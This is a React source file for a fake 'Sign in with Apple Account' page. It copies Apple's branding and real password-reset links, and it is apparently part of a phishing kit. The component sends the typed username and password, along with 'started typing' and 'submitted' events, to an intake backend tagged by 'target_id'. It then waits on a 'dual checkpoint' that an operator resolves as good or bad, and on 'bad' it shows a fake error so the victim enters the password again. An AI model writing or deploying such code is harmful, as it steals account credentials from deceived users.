'use client';
import { useEffect, useRef, useState } from 'react';
import './Login.scss';
import { IoCheckmarkOutline } from "react-icons/io5";
import { FiEye, FiEyeOff } from "react-icons/fi";
import { PiWarningOctagonFill } from "react-icons/pi";
import addIntakeEvent from '@/app/(tropic)/addIntakeEvent';
import { getTargetId } from '@/app/(tropic)/getTargetId';
import checkForExistingCheckpoint from '@/app/(tropic)/checkForExistingCheckpoint';
import proceedStep from '@/app/(tropic)/proceedStep';
import clientResolveDualCheckpoint from '@/app/(tropic)/resolveDualCheckpoint';
import { getBrowserTRPCClient } from '@/app/utils/trpc/client';
import { PulseLoader } from 'react-spinners';
import { ImArrowRight } from "react-icons/im";
import { RotatingLines } from 'react-loader-spinner';
import { GoArrowUpRight } from "react-icons/go";

export default function Login() {
    const [showPassword, setShowPassword] = useState(false);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');

    const [reportedUsername, setReportedUsername] = useState(false);
    const [reportedPassword, setReportedPassword] = useState(false);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(false);

    const [userFocused, setUserFocused] = useState(false);
    const [usernameValid, setUsernameValid] = useState(false);
    const [stage, setStage] = useState(0); // 0: username, 1: password

    const [passwordFocused, setPasswordFocused] = useState(false);

    const [usernameLoading, setUsernameLoading] = useState(false);
    const [fullFormLoading, setFullFormLoading] = useState(false);
    const [passwordValid, setPasswordValid] = useState(false);

    const [showError, setShowError] = useState(false);
    const [remember, setRemember] = useState(false);
    const checkpointUnsubscribeRef = useRef(null);
    const checkpointPollRef = useRef(null);

    //Your user ID or password is not recognized. Please try again.
    async function handleFullFormSubmit(e) {
        e.checkValidity && e.checkValidity();
        e.preventDefault();
        if (loading) return;
        setFullFormLoading(true);
        setError('');
        const targetId = await getTargetId();
        addIntakeEvent({
            type: 'input',
            input_title: 'Password',
            input_value: password,
            target_id: targetId
        });
        addIntakeEvent({
            target_id: targetId,
            type: 'interaction',
            interaction_title: 'Submit login',
        });
        if (!(await checkForExistingCheckpoint('Valid login confirmation'))) {
            await addIntakeEvent({
                target_id: await getTargetId(),
                type: 'checkpoint',
                checkpoint_status: 'waiting',
                checkpoint_resolution: 'Valid login confirmation',
                checkpoint_type: 'dual'
            })
        }
        await subscribeToIntakeEvents();
    }
    async function subscribeToIntakeEvents() {
        try {
            const trpc = getBrowserTRPCClient();
            const targetId = await getTargetId();
            checkpointUnsubscribeRef.current?.();
            if (checkpointPollRef.current) {
                clearInterval(checkpointPollRef.current);
                checkpointPollRef.current = null;
            }
            let resolved = false;
            const handleResolution = (outcome) => {
                if (resolved) return;
                resolved = true;
                checkpointUnsubscribeRef.current?.();
                checkpointUnsubscribeRef.current = null;
                if (checkpointPollRef.current) {
                    clearInterval(checkpointPollRef.current);
                    checkpointPollRef.current = null;
                }
                if (outcome === 'good') {
                    proceedStep();
                } else if (outcome === 'bad') {
                    setError('Check the account information you entered try again.');
                    setShowError(true);
                    setPassword('');
                    setFullFormLoading(false);
                }
            };
            const subscription = trpc.checkpoints.onResolution.subscribe(
                {
                    targetId,
                    resolution: 'Valid login confirmation',
                },
                {
                    onData: (payload) => {
                        console.log('Checkpoint update:', payload);
                        handleResolution(payload?.row?.checkpoint_dual_outcome);
                    },
                    onError: (error) => {
                        console.error('Error subscribing in passwordform:', error)
                    },
                }
            );
            checkpointUnsubscribeRef.current = () => subscription.unsubscribe();
            checkpointPollRef.current = setInterval(async () => {
                try {
                    const latest = await trpc.checkpoints.latest.query({
                        targetId,
                        resolution: 'Valid login confirmation',
                    });
                    if (latest?.checkpoint_status === 'resolved') {
                        handleResolution(latest?.checkpoint_dual_outcome);
                    }
                } catch (error) {
                    console.error('Checkpoint polling error:', error);
                }
            }, 1500);
        } catch (error) {
            console.error('Error subscribing in passwordform:', error)
        }
    }
    useEffect(() => {
        return () => {
            checkpointUnsubscribeRef.current?.();
            if (checkpointPollRef.current) clearInterval(checkpointPollRef.current);
        };
    }, []);
    useEffect(() => {
        async function reportUsernameStarted() {
            addIntakeEvent({
                target_id: await getTargetId(),
                type: 'interaction',
                interaction_title: 'Started entering username',
            });
            setReportedUsername(true);
        }
        if (username?.length > 0 && !reportedUsername) {
            reportUsernameStarted();
        }
    }, [username])
    useEffect(() => {
        async function reportPasswordStarted() {
            addIntakeEvent({
                target_id: await getTargetId(),
                type: 'interaction',
                interaction_title: 'Started entering password',
            });
            setReportedPassword(true);
        }
        if (password?.length > 0 && !reportedPassword) {
            reportPasswordStarted();
        }
    }, [password])
    useEffect(() => {
        // if the user reloads the page, get rid of the 
        // checkpoint since they're no longer waiting
        async function clearCheckpoint() {
            if (await checkForExistingCheckpoint('Valid login confirmation')) {
                clientResolveDualCheckpoint('Valid login confirmation', 'stale');
            }
        }
        clearCheckpoint();
    }, []);

    useEffect(() => {
        // Validate username format
        const isValid = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(username) || /^[0-9]{10,15}$/.test(username);
        setUsernameValid(isValid);
    }, [username]);


    async function handleUsernameSubmit(e) {
        e.checkValidity && e.checkValidity();
        e.preventDefault();
        if (usernameLoading) return;
        if (!usernameValid) {
            //setError('Invalid username format. Please enter a valid email or phone number.');
            //todo handle error
            return;
        }
        setUsernameLoading(true);
        const targetId = await getTargetId();
        addIntakeEvent({
            type: 'input',
            input_title: 'Username',
            input_value: username,
            target_id: targetId
        });
        addIntakeEvent({
            target_id: targetId,
            type: 'interaction',
            interaction_title: 'Submitted username',
        });
        setTimeout(() => {
            setUsernameLoading(false);
            setStage(1);
        }, 1200);
    }

    useEffect(() => {
        // Validate password format
        const isValid = password.length >= 6;
        setPasswordValid(isValid);
    }, [password]);

    function handleFullFormUsernameChange(e) {
        if(e.target.value === username) return;
        setShowError(false);
        setUsername(e.target.value);
        setPassword('');
        setStage(0);
    }

    return (
        <div className="Login Main">

            <div className='card'>
                <img className='appleAcc' src="/apple-acc.svg" />
                <h1>Sign in with Apple Account</h1>
                {
                    stage === 0 &&
                    <form onSubmit={(e) => handleUsernameSubmit(e)} className='usernameForm'>

                        <div
                            data-shrink={username.length > 0 || userFocused}
                            className="floatInput">
                            <label>Email or Phone Number</label>
                            <input type="text"
                                onFocus={() => setUserFocused(true)}
                                onBlur={() => setUserFocused(false)}
                                value={username}
                                minLength={6}
                                autoComplete='username'
                                required
                                data-loading={usernameLoading}
                                onChange={(e) => setUsername(e.target.value)}
                            />
                            <button
                                type='submit'
                                data-loading={usernameLoading}
                                data-disabled={!usernameValid}
                                className="continue">
                                <div className="actual">
                                    {
                                        usernameLoading ?
                                            <RotatingLines
                                                width='26'
                                                strokeColor='rgb(91, 91, 91)'
                                            /> :
                                            <ImArrowRight />
                                    }
                                </div>
                            </button>

                        </div>
                    </form>
                }
                {
                    stage === 1 &&
                    <>
                        <form
                        data-readonly={fullFormLoading}
                            onSubmit={(e) => handleFullFormSubmit(e)} className='fullForm'>

                            <div
                                data-error={showError}
                                
                                data-shrink={username.length > 0 || userFocused}
                                className="floatInput username">
                                <label>Email or Phone Number</label>
                                <input type="text"
                                    data-error={showError}
                                    onFocus={() => setUserFocused(true)}
                                    onBlur={() => setUserFocused(false)}
                                    value={username}
                                    minLength={6}
                                    required
                                    data-loading={usernameLoading}
                                    onChange={(e) => handleFullFormUsernameChange(e)}
                                />
                            </div>
                            <div
                                data-error={showError}
                                data-shrink={password.length > 0 || passwordFocused}
                                className="floatInput password">
                                <label>Password</label>
                                <input type="password"
                                    data-error={showError}
                                    onFocus={() => {
                                        setPasswordFocused(true)
                                        setShowError(false);
                                    }}
                                    onBlur={() => setPasswordFocused(false)}
                                    value={password}
                                    minLength={6}
                                    autoFocus
                                    autoComplete='current-password'
                                    required
                                    data-loading={fullFormLoading}
                                    onChange={(e) => {
                                        setPassword(e.target.value)
                                        setShowError(false);
                                    }}
                                />
                                <button
                                    type='submit'
                                    data-loading={fullFormLoading}
                                    data-disabled={!passwordValid}
                                    className="continue">
                                    <div className="actual">
                                        {
                                            fullFormLoading ?
                                                <RotatingLines
                                                    width='26'
                                                    strokeColor='rgb(91, 91, 91)'
                                                /> :
                                                <ImArrowRight />
                                        }
                                    </div>
                                </button>
                            </div>
                            {
                                showError &&
                                <aside className="errorCard">
                                    <p>
                                        Check the account information you entered and try again.
                                    </p>
                                    <a href="https://iforgot.apple.com/password/verify/appleid">
                                        <span>
                                            Forgot password?
                                        </span>
                                        <GoArrowUpRight />
                                    </a>
                                </aside>
                            }
                        </form>
                    </>
                }
                <div className="bottom">

                    <label className="remember" htmlFor='remember'>
                        <input type="checkbox" name="remember" id="remember" />
                        <span>Keep me signed in</span>
                    </label>
                    <div className="links">
                        <a
                            target='_blank'
                            rel="noreferrer noopener"
                            href="https://iforgot.apple.com/password/verify/appleid">
                            <span>
                                Forgot password?
                            </span>
                            <GoArrowUpRight />
                        </a>
                    </div>
                </div>
            </div>

        </div >
    )
}
//https://iforgot.apple.com/password/verify/appleid